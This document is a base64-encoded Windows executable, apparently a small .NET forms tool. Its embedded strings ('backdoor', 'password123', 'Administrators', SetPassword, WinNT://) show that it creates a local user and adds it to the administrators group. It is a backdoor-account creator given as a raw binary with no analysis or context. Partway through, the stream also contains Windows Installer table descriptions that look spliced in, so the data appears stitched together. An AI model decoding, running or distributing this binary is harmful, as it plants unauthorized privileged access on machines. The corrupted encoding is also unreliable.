AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDWYF5TAAAAAAAAAADgAAIBCwEIAAAcAAAACAAAAAAAAO47AAAAIAAAAEAAAAAAQAAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAACAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACcOwAATwAAAABAAADABQAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAA2DoAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAPQbAAAAIAAAABwAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAADABQAAAEAAAAAGAAAAHgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAACQAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAA0DsAAAAAAABIAAAAAgAFAIgnAABQEwAAAQAAAAwAAAYYJgAAcAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2AigQAAAKAigIAAAGKgYqBioGKhMwBQDQAAAAAQAAEXIBAABwKBEAAApyEwAAcCgSAAAKcxMAAAoKBm8UAAAKAnsCAAAEbxUAAApyJwAAcG8WAAAKCwdyMQAAcBeNAwAAAQ0JFgJ7BQAABG8VAAAKoglvFwAACiYHckkAAHAYjQMAAAETBBEEFnJRAABwohEEF3JpAABwohEEbxcAAAomB28YAAAKBm8UAAAKAnsHAAAEbxUAAApycwAAcG8ZAAAKDAgsJQhyfwAAcBeNAwAAARMFEQUWB28aAAAKbxsAAAqiEQVvFwAACiYoHAAACioGKnoDLBMCewEAAAQsCwJ7AQAABG8dAAAKAgMoHgAACioAAAADMAQAGwQAAAAAAAACcx8AAAp9AgAABAJzIAAACn0DAAAEAnMgAAAKfQQAAAQCcx8AAAp9BQAABAJzIAAACn0GAAAEAnMfAAAKfQcAAAQCcyEAAAp9CAAABAIoIgAACgJ7AgAABB8WHyZzIwAACm8kAAAKAnsCAAAEcocAAHBvJQAACgJ7AgAABCDsAAAAHxRzJgAACm8nAAAKAnsCAAAEFm8oAAAKAnsCAAAEcpkAAHBvKQAACgJ7AwAABBdvKgAACgJ7AwAABB8THxZzIwAACm8kAAAKAnsDAAAEcqsAAHBvJQAACgJ7AwAABB83Hw1zJgAACm8nAAAKAnsDAAAEF28oAAAKAnsDAAAEcrkAAHBvKQAACgJ7AwAABAL+BgMAAAZzKwAACm8sAAAKAnsEAAAEF28qAAAKAnsEAAAEHxMfUXMjAAAKbyQAAAoCewQAAARyywAAcG8lAAAKAnsEAAAEHzUfDXMmAAAKbycAAAoCewQAAAQYbygAAAoCewQAAARy2QAAcG8pAAAKAnsFAAAEHxYfYXMjAAAKbyQAAAoCewUAAARy6wAAcG8lAAAKAnsFAAAEIOwAAAAfFHMmAAAKbycAAAoCewUAAAQZbygAAAoCewUAAARy/QAAcG8pAAAKAnsGAAAEF28qAAAKAnsGAAAEHxMgiQAAAHMjAAAKbyQAAAoCewYAAARyFQEAcG8lAAAKAnsGAAAEHyQfDXMmAAAKbycAAAoCewYAAAQabygAAAoCewYAAARyIwEAcG8pAAAKAnsGAAAEAv4GBAAABnMrAAAKbywAAAoCewcAAAQfFiCZAAAAcyMAAApvJAAACgJ7BwAABHJzAABwbyUAAAoCewcAAAQg7AAAAB8UcyYAAApvJwAACgJ7BwAABBtvKAAACgJ7BwAABHIvAQBwbykAAAoCewcAAAQC/gYGAAAGcysAAApvLQAACgJ7CAAABB9mIMAAAABzIwAACm8kAAAKAnsIAAAEck0BAHBvJQAACgJ7CAAABB9LHxdzJgAACm8nAAAKAnsIAAAEHG8oAAAKAnsIAAAEcl0BAHBvKQAACgJ7CAAABBdvLgAACgJ7CAAABAL+BgUAAAZzKwAACm8sAAAKAiIAAMBAIgAAUEFzLwAACigwAAAKAhcoMQAACgIgHAEAACDjAAAAcyYAAAooMgAACgIoMwAACgJ7CAAABG80AAAKAigzAAAKAnsHAAAEbzQAAAoCKDMAAAoCewYAAARvNAAACgIoMwAACgJ7BQAABG80AAAKAigzAAAKAnsEAAAEbzQAAAoCKDMAAAoCewMAAARvNAAACgIoMwAACgJ7AgAABG80AAAKAnJrAQBwKCUAAAoCcncBAHBvKQAACgIC/gYCAAAGcysAAAooNQAACgIWKDYAAAoCKDcAAAoqGn4JAAAEKlZzCgAABig6AAAKdAMAAAKACQAABCoeAig7AAAKKlooPQAAChYoPgAACnMBAAAGKD8AAAoqHgIoQQAACioAEzADAC0AAAACAAARfgoAAAQtIHKJAQBw0AUAAAIoQgAACm9DAAAKc0QAAAoKBoAKAAAEfgoAAAQqGn4LAAAEKh4CgAsAAAQqtAAAAM7K774BAAAAkQAAAGxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlUmVhZGVyLCBtc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkjU3lzdGVtLlJlc291cmNlcy5SdW50aW1lUmVzb3VyY2VTZXQCAAAAAAAAAAAAAABQQURQQURQtAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5c3RlbS5SZXNvdXJjZXMuUnVudGltZVJlc291cmNlU2V0AgAAAAAAAAAAAAAAUEFEUEFEULQAAABCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAAAoBgAAI34AAJQGAABYCAAAI1N0cmluZ3MAAAAA7A4AAOgBAAAjVVMA1BAAABAAAAAjR1VJRAAAAOQQAABsAgAAI0Jsb2IAAAAAAAAAAgAAAVcVogEJAQAAAPoBMwAWAAABAAAAMwAAAAUAAAALAAAAEAAAAAwAAABFAAAAFQAAAAIAAAACAAAAAwAAAAQAAAABAAAABQAAAAIAAAAAAAoAAQAAAAAABgCaAIUACgC7AKYADgDcAJ8ADgDpAJ8ACgBOATgBBgCAAYUABgCRAYUABgC7AYUADgAEAvMBDgA1AiACDgCwAp4CDgDHAp4CDgDkAp4CDgADA54CDgAcA54CDgA1A54CDgBQA54CDgBrA54CDgCjA4QDDgC3A4QDDgDFA54CDgDeA54CDgAOBPsDXwAiBAAADgBRBDEEDgBxBDEEDgCPBJ8ADgCrBJ8AEgDSBLkEEgDhBLkEBgD/BIUABgBABYUADgBRBZ8AFgB6BWsFFgCWBWsFDgDHBZ8ABgDuBYUAFgAVBmsFBgAbBoUABgBEBoUAfwBzBgAADgC2BjEECgDpBtEGCgAHB6YADgAhB58ADgBtB/sDDgCKB58ADgCPB58ADgCzB54CCgDJBzgBCgDiBzgBAAAAAAEAAAAAAAEAAQABABAAJwAtAAUAAQABAAABEABGAE8ACQAJAAkAgAEQAHMALQANAAoADAAAABAAewBPAA0ACgANAAEAWQEVAAEAiAEeAAEAlwEiAAEAngEiAAEApQEeAAEArgEiAAEAtQEeAAEAwgEmABEAygEqABEAFAI8ABEAQQJAAFAgAAAAAIYY4wAKAAEAXiAAAAAAgQDzAA4AAQBgIAAAAACBAP4ADgADAGIgAAAAAIEACwEOAAUAZCAAAAAAgQAYAQ4ABwBAIQAAAACBACYBDgAJAEIhAAAAAMQAZAEZAAsAZCEAAAAAgQBsAQoADACLJQAAAACWCNoBLgAMAKglAAAAAIYY4wAKAAwAkiUAAAAAkRgABzgADACwJQAAAACRAO4BOAAMAMclAAAAAIMY4wAKAAwA0CUAAAAAkwhRAkQADAAJJgAAAACTCGUCSQAMABAmAAAAAJMIcQJOAAwAAAABAIUCAAACAIwCAAABAIUCAAACAIwCAAABAIUCAAACAIwCAAABAIUCAAACAIwCAAABAIUCAAACAIwCAAABAI4CAAABAJgCWQDjAF4AYQDjAF4AaQDjAF4AcQDjAF4AeQDjAF4AgQDjAF4AiQDjAF4AkQDjAF4AmQDjABkAoQDjAF4AqQDjAF4AsQDjAF4AuQDjAGMAyQDjAGkA0QDjAAoACQDjAAoA2QCbBG4A4QCyBHIA6QDjAF4A6QDyBIIA+QAHBYcA8QAQBYsA6QAUBZIA6QAbBQoA8QApBYsA6QAuBYcAGQA3BYcAAQFMBTgACQFkAQoACQBkARkAMQDjAAoAOQDjAAoAQQDjAAoA+QBdBQoAIwABAE8AAQAWAAcAEQAHAA8ABQBIAAEASAABAAUADQAGAAIANwABAAwAAgA2AAEACgACAIQAAQAHAAMAZgABAAsAAgAjAAEACAAIADcAAQA+AAEAMAABAAgADwAhAAEABAACAD8AAQADAAIABwABAB8AAQAYAAEAEwABAG4AAQAHAA8ACwADADsAAQAKAAIAfgABAAoAAgB+AAEAYAABACMAAQAGAAIAYAABAA4AAgA4AAEADgAFAAgABAAMAAUADwADABEAAwATAAEADAACAA8AAwANAAIADwACAA4AAgAWAAIAEgAEABMABwAmAAEAEAACACMAAgAWAAIAEQADABIAAQAYAAIAGAABABIAAgBqAAEAEQABABMAAgATAAEAEgACABkAAQAJAAIAAQABAAkAAQAOAAIADAABAAAAAAATAAIAEAACABEAAgAUAAIAEQABABEAAQAUAAEAEwABAAwAAQAPAAEAFgABAC0ABAAsAAEAGgABABsAAQAIAAEAAQADAAsAAQALAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAQABAAEAAAAAAAAAAAAOAAEACgABABgAAQABAAEAAAAAAAAAAAAbAAEAAQAIABwAAQAeAAEAGwABAAAAAAAdAAEAHgABACAAAQAdAAEADAABAAQAAQAMAAEACwABACYAAQAPAAEABAABAAsAAQA3AAEADgABAAcAAwAUAAEAFgABACsAAQBCAAUACQABAAsAAQAjAAEACAABAAoAAQAjAAEABAABAAYAAQAjAAEABAABAAYAAQAjAAEAEQABABMAAQAAAAAAFgABAAcAAQAmAAMABQACAAAAAAAEAAIABgACAAsAFQAFAAUAAQAsAAoAAQATAAIACwAGAAMAAgAIAAIACQACAAgAAgAGAAYABgAGAAYABgAGAAYABgAGACIAIgAiACkAKQApACoAKgAqACsAKwAvAC8ALwAvAC8ALwA1ADUANQA9AD0APQA9AD0ATQBNAE0ATQBNAE0ATQBNAFwAXABhAGEAYQBhAGEAYQBhAGEAbwBvAHIAcgByAHMAcwBzAHQAdAB3AHcAdwB3AHcAdwCCAIIAhgCGAIYAhgCGAIYAkACQAJAAkACQAJAAkAABgAKAA4AEgAWABoAHgAiACYAKgAGAAoADgAGAAoADgAGAAoADgAGAAoABgAKAA4AEgAWABoABgAKAA4ABgAKAA4AEgAWAAYACgAOABIAFgAaAB4AIgAGAAoABgAKAA4AEgAWABoAHgAiAAYACgAGAAoADgAGAAoADgAGAAoABgAKAA4AEgAWABoABgAKAAYACgAOABIAFgAaAAYACgAOABIAFgAaAB4ACAAUAEAASAA8AEQAOAA0ADAALACMAJQAnACMAJQAnACMAJQAnAAEALQAvADEANAA3ACUAOgA1AEkASwAjAAQAQABDAEYATQBPAFEACwBUAFYANAA3AF0AXwBhAF8AZABnAGkAawA3ACcAAQAtACMAJQAnACMAJQAnACUACwB4AHoAfAB+AIAAQACCAAcAhgCIAIoAAQAHAF8AkQCTAJUAawA3AJkAmwAgrSCtBI0EkQSR/50ClSCd/53/nUit/50ClUit/50ClUit/50ClUitAIlIrSadSI0Chf+dSJ1IrUid/49IrQKFSJ3/nQSRJq0mnUCf/58ClQKFSJ0ChSatSK1IrUiN/48EgUidFJ0ClQSBSK0AiUit/50ClUit/50Clf+t/48CpQSBQJ//nSCdSJ1IrQCPSK0Chf+P/58An0iNJq0UvRS9/70Eof+dSI0SAAIAGQABAAkAAgABAAEACQABAA4AAgAMAAEACwACABEBEQEAAPsA+wAAAAAAAAABAACAAgAAgAAAAAD8AA8BDAABAA8AAQAWAAEALQAEACwAAQAaAAEAGwABAAgAAQCRAM8A0QDSAN0A4QDjAOcA6QDqAOsA7QDuAO8A8ADxAPMA9AD2APgA+gD9ABEB0ADQANAA3gDiAOQA6ADoAOgA6ADoAOgA6ADoAPIAEAH1APcA+QD7AP4ACAABABsAAQABAAkAHAABAB4AAQAbAAEAHAABAB0AAQAeAAEAIAABAKgAqQABAAEABgABAAwAAQALAAEAJgABAA8AAQAEAAEACwABABQAAQAOAAEABwADACYAAwAWAAEAKwABAEIABQAGACIAKQAqACsALwA1AD0ATQBcAGEAbwByAHMAdAB3AIIAhgCQAAEABgABACMAAQARAAEAEwABABQAAQAWAAEA/v8AAAYBAgAAAAAAAAAAAAAAAAAAAAAAAQAAAALVzdWcLhsQk5cIACss+a4wAAAAUAAAAAMAAAABAAAAKAAAAAAAAIAwAAAADwAAADgAAAAAAAAAAAAAAAIAAACwBAAAEwAAAAkEAAAfAAAACAAAAFAAbwB3AGUAcgBVAHAAAABkR3VpZEEgc3RyaW5nIEdVSUQgdW5pcXVlIHRvIHRoaXMgY29tcG9uZW50LCB2ZXJzaW9uLCBhbmQgbGFuZ3VhZ2UuRGlyZWN0b3J5X0RpcmVjdG9yeVJlcXVpcmVkIGtleSBvZiBhIERpcmVjdG9yeSB0YWJsZSByZWNvcmQuIFRoaXMgaXMgYWN0dWFsbHkgYSBwcm9wZXJ0eSBuYW1lIHdob3NlIHZhbHVlIGNvbnRhaW5zIHRoZSBhY3R1YWwgcGF0aCwgc2V0IGVpdGhlciBieSB0aGUgQXBwU2VhcmNoIGFjdGlvbiBvciB3aXRoIHRoZSBkZWZhdWx0IHNldHRpbmcgb2J0YWluZWQgZnJvbSB0aGUgRGlyZWN0b3J5IHRhYmxlLkF0dHJpYnV0ZXNSZW1vdGUgZXhlY3V0aW9uIG9wdGlvbiwgb25lIG9mIGlyc0VudW1BIGNvbmRpdGlvbmFsIHN0YXRlbWVudCB0aGF0IHdpbGwgZGlzYWJsZSB0aGlzIGNvbXBvbmVudCBpZiB0aGUgc3BlY2lmaWVkIGNvbmRpdGlvbiBldmFsdWF0ZXMgdG8gdGhlICdUcnVlJyBzdGF0ZS4gSWYgYSBjb21wb25lbnQgaXMgZGlzYWJsZWQsIGl0IHdpbGwgbm90IGJlIGluc3RhbGxlZCwgcmVnYXJkbGVzcyBvZiB0aGUgJ0FjdGlvbicgc3RhdGUgYXNzb2NpYXRlZCB3aXRoIHRoZSBjb21wb25lbnQuS2V5UGF0aEZpbGU7UmVnaXN0cnk7T0RCQ0RhdGFTb3VyY2VFaXRoZXIgdGhlIHByaW1hcnkga2V5IGludG8gdGhlIEZpbGUgdGFibGUsIFJlZ2lzdHJ5IHRhYmxlLCBvciBPREJDRGF0YVNvdXJjZSB0YWJsZS4gVGhpcyBleHRyYWN0IHBhdGggaXMgc3RvcmVkIHdoZW4gdGhlIGNvbXBvbmVudCBpcyBpbnN0YWxsZWQsIGFuZCBpcyB1c2VkIHRvIGRldGVjdCB0aGUgcHJlc2VuY2Ugb2YgdGhlIGNvbXBvbmVudCBhbmQgdG8gcmV0dXJuIHRoZSBwYXRoIHRvIGl0LkN1c3RvbUFjdGlvblByaW1hcnkga2V5LCBuYW1lIG9mIGFjdGlvbiwgbm9ybWFsbHkgYXBwZWFycyBpbiBzZXF1ZW5jZSB0YWJsZSB1bmxlc3MgcHJpdmF0ZSB1c2UuVGhlIG51bWVyaWMgY3VzdG9tIGFjdGlvbiB0eXBlLCBjb25zaXN0aW5nIG9mIHNvdXJjZSBsb2NhdGlvbiwgY29kZSB0eXBlLCBlbnRyeSwgb3B0aW9uIGZsYWdzLlNvdXJjZUN1c3RvbVNvdXJjZVRoZSB0YWJsZSByZWZlcmVuY2Ugb2YgdGhlIHNvdXJjZSBvZiB0aGUgY29kZS5UYXJnZXRGb3JtYXR0ZWRFeGNlY3V0aW9uIHBhcmFtZXRlciwgZGVwZW5kcyBvbiB0aGUgdHlwZSBvZiBjdXN0b20gYWN0aW9uRXh0ZW5kZWRUeXBlQSBudW1lcmljIGN1c3RvbSBhY3Rpb24gdHlwZSB0aGF0IGV4dGVuZHMgY29kZSB0eXBlIG9yIG9wdGlvbiBmbGFncyBvZiB0aGUgVHlwZSBjb2x1bW4uVW5pcXVlIGlkZW50aWZpZXIgZm9yIGRpcmVjdG9yeSBlbnRyeSwgcHJpbWFyeSBrZXkuIElmIGEgcHJvcGVydHkgYnkgdGhpcyBuYW1lIGlzIGRlZmluZWQsIGl0IGNvbnRhaW5zIHRoZSBmdWxsIHBhdGggdG8gdGhlIGRpcmVjdG9yeS5EaXJlY3RvcnlfUGFyZW50UmVmZXJlbmNlIHRvIHRoZSBlbnRyeSBpbiB0aGlzIHRhYmxlIHNwZWNpZnlpbmcgdGhlIGRlZmF1bHQgcGFyZW50IGRpcmVjdG9yeS4gQSByZWNvcmQgcGFyZW50ZWQgdG8gaXRzZWxmIG9yIHdpdGggYSBOdWxsIHBhcmVudCByZXByZXNlbnRzIGEgcm9vdCBvZiB0aGUgaW5zdGFsbCB0cmVlLkRlZmF1bHREaXJUaGUgZGVmYXVsdCBzdWItcGF0aCB1bmRlciBwYXJlbnQncyBwYXRoLkZlYXR1cmVQcmltYXJ5IGtleSB1c2VkIHRvIGlkZW50aWZ5IGEgcGFydGljdWxhciBmZWF0dXJlIHJlY29yZC5GZWF0dXJlX1BhcmVudE9wdGlvbmFsIGtleSBvZiBhIHBhcmVudCByZWNvcmQgaW4gdGhlIHNhbWUgdGFibGUuIElmIHRoZSBwYXJlbnQgaXMgbm90IHNlbGVjdGVkLCB0aGVuIHRoZSByZWNvcmQgd2lsbCBub3QgYmUgaW5zdGFsbGVkLiBOdWxsIGluZGljYXRlcyBhIHJvb3QgaXRlbQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEB4wCoAPkAgAWuAPkAjQVeABkB4wCoAPkAmwW1APkApAVpAPkAsQVeAPkAugUZACEB4wC8APkA1AXCAPkA3gXCACkB+QUZADEB4wDJADkBLAbPADkBUgbWAAkAZAa1APkAhQbdAEkBEAXjAAkAkgbCAPkAmwYZAPkAqAYKAFEB4wAKAFkB4wDuAGEBFAdNAREA4wAKAGkB4wAKAAEBNAc4AAEBRwdWAQEBaQdbAXEB4wAKABkA4wAKAHkBoQeiAXkBvAerAUkA4wCxAZEB4wC+AS4AGwDsAS4AewBKAi4AMwDyAS4ACwDOAS4AEwDsAS4AIwDsAS4AKwDOAS4AUwAKAi4AcwBBAi4ASwDsAS4AOwDsAS4AYwA0Ai4AawDFAUkAKwLFAWMAywH0AGMAwwHpAGkAKwLFAaMAAwLpAKMAwwHpAKMAywFhAYAB4wHpAJkAuQEDAAEABQACAAAA5gEzAAAABAJUAAAAfQJZAAIACQADAAIADgAFAAIADwAHAAEAEAAHAASAAAABAAAAAAAAAAAAAAAAAC0AAAACAAAAAAAAAAAAAAABAIUAAAAAAAIAAAAAAAAAAAAAAAEAnwAAAAAAAgAAAAAAAAAAAAAAAQDTAAAAAAACAAAAAAAAAAAAAAB5ALkEAAAAAAIAAAAAAAAAAAAAAHkAawUAAAAAAAAAAAEAAAD3BwAAuAAAAAEAAAAgCAAAAAAAAAA8TW9kdWxlPgBXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEuZXhlAEZvcm0xAFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uMQBTZXR0aW5ncwBXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEuUHJvcGVydGllcwBQcm9ncmFtAFJlc291cmNlcwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBGb3JtAFN5c3RlbQBTeXN0ZW0uQ29uZmlndXJhdGlvbgBBcHBsaWNhdGlvblNldHRpbmdzQmFzZQBtc2NvcmxpYgBPYmplY3QALmN0b3IARXZlbnRBcmdzAEZvcm0xX0xvYWQAbGFiZWwxX0NsaWNrAGxhYmVsM19DbGljawBidXR0b24xX0NsaWNrAGdyb3VwX1RleHRDaGFuZ2VkAFN5c3RlbS5Db21wb25lbnRNb2RlbABJQ29udGFpbmVyAGNvbXBvbmVudHMARGlzcG9zZQBJbml0aWFsaXplQ29tcG9uZW50AFRleHRCb3gAdXNlcm5hbWUATGFiZWwAbGFiZWwxAGxhYmVsMgBwYXNzd29yZABsYWJlbDMAZ3JvdXAAQnV0dG9uAGJ1dHRvbjEAZGVmYXVsdEluc3RhbmNlAGdldF9EZWZhdWx0AERlZmF1bHQATWFpbgBTeXN0ZW0uUmVzb3VyY2VzAFJlc291cmNlTWFuYWdlcgByZXNvdXJjZU1hbgBTeXN0ZW0uR2xvYmFsaXphdGlvbgBDdWx0dXJlSW5mbwByZXNvdXJjZUN1bHR1cmUAZ2V0X1Jlc291cmNlTWFuYWdlcgBnZXRfQ3VsdHVyZQBzZXRfQ3VsdHVyZQBDdWx0dXJlAHNlbmRlcgBlAGRpc3Bvc2luZwB2YWx1ZQBTeXN0ZW0uUmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEVudmlyb25tZW50AGdldF9NYWNoaW5lTmFtZQBTdHJpbmcAQ29uY2F0AFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcwBEaXJlY3RvcnlFbnRyeQBEaXJlY3RvcnlFbnRyaWVzAGdldF9DaGlsZHJlbgBDb250cm9sAGdldF9UZXh0AEFkZABJbnZva2UAQ29tbWl0Q2hhbmdlcwBGaW5kAGdldF9QYXRoAFRvU3RyaW5nAEFwcGxpY2F0aW9uAEV4aXQASURpc3Bvc2FibGUAU3VzcGVuZExheW91dABTeXN0ZW0uRHJhd2luZwBQb2ludABzZXRfTG9jYXRpb24Ac2V0X05hbWUAU2l6ZQBzZXRfU2l6ZQBzZXRfVGFiSW5kZXgAc2V0X1RleHQAc2V0X0F1dG9TaXplAEV2ZW50SGFuZGxlcgBhZGRfQ2xpY2sAYWRkX1RleHRDaGFuZ2VkAEJ1dHRvbkJhc2UAc2V0X1VzZVZpc3VhbFN0eWxlQmFja0NvbG9yAFNpemVGAENvbnRhaW5lckNvbnRyb2wAc2V0X0F1dG9TY2FsZURpbWVuc2lvbnMAQXV0b1NjYWxlTW9kZQBzZXRfQXV0b1NjYWxlTW9kZQBzZXRfQ2xpZW50U2l6ZQBDb250cm9sQ29sbGVjdGlvbgBnZXRfQ29udHJvbHMAYWRkX0xvYWQAUmVzdW1lTGF5b3V0AFBlcmZvcm1MYXlvdXQAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQAuY2N0b3IAU2V0dGluZ3NCYXNlAFN5bmNocm9uaXplZABTVEFUaHJlYWRBdHRyaWJ1dGUARW5hYmxlVmlzdWFsU3R5bGVzAFNldENvbXBhdGlibGVUZXh0UmVuZGVyaW5nRGVmYXVsdABSdW4ARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBUeXBlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAEFzc2VtYmx5AGdldF9Bc3NlbWJseQBFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUARWRpdG9yQnJvd3NhYmxlU3RhdGUAV2luZG93c0Zvcm1zQXBwbGljYXRpb24xLkZvcm0xLnJlc291cmNlcwBXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEuUHJvcGVydGllcy5SZXNvdXJjZXMucmVzb3VyY2VzAAARVwBpAG4ATgBUADoALwAvAAATLABjAG8AbQBwAHUAdABlAHIAAAl1AHMAZQByAAAXUwBlAHQAUABhAHMAcwB3AG8AcgBkAAAHUAB1AHQAABdEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAlVAHMAZQByAAALZwByAG8AdQBwAAAHQQBkAGQAABF1AHMAZQByAG4AYQBtAGUAABFiAGEAYwBrAGQAbwBvAHIAAA1sAGEAYgBlAGwAMQAAEVUAcwBlAHIAbgBhAG0AZQAADWwAYQBiAGUAbAAyAAARUABhAHMAcwB3AG8AcgBkAAARcABhAHMAcwB3AG8AcgBkAAAXcABhAHMAcwB3AG8AcgBkADEAMgAzAAANbABhAGIAZQBsADMAAAtHAHIAbwB1AHAAAB1BAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAAA9iAHUAdAB0AG8AbgAxAAANQwByAGUAYQB0AGUAAAtGAG8AcgBtADEAA